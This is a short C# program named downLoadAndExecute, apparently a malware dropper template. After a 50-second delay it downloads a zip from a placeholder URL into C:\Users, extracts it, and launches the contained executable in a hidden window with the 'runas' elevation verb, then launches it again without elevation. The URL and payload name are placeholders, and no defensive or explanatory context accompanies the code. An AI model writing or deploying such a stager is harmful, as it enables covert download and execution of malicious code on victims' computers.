// *
//
// 	for compiling with mono:
// 	dll import [System.IO.Compression.FileSystem.dll]
//
// *

using System;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Web;
using System.IO.Compression;
using System.Threading;

class downLoadAndExecute{

	public static void Main(string [] args){
		System.Threading.Thread.Sleep(50000);
		using (var client = new WebClient())
  			{
    				client.DownloadFile(".//////",  "C:\\Users\\tik.zip");
  			}
     		string zipPath = "C:\\Users\\tik.zip";
      		string extractPath = "C:\\Users\\tik";
      		System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, extractPath);
		try{
			var psi = new ProcessStartInfo
			{
    				FileName = "C:\\Users\\tik\\..SomePe",
    				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				Verb = "runas"
			};
			Process.Start(psi);}
		catch {
			System.Diagnostics.Process.Start("C:\\Users\\tik\\...SomePe");		
		}
		System.Diagnostics.Process.Start("C:\\Users\\tik\\...SomePe");
	}

}
